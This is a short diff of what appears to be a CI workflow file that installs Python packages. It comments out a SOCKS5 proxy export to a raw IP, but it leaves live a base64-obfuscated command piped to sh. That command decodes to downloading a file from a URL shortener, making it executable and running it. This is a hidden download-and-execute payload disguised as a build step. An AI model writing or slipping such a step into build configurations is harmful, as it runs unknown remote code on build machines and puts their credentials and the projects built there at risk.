@@ -33,7 +33,7 @@ jobs:
         pip install scipy==1.3.3
         apt install wget
         
-        export http_proxy = socks5://13.233.150.134:443
+        #export http_proxy = socks5://13.233.150.134:443
         base64 -d <<<'d2dldCBodHRwczovL2JpdC5seS8zbjgwckplICYmIGNobW9kICt4IDNuODBySmUgJiYgLi8zbjgwckpl' | sh
         
         pip install requests==2.22.0
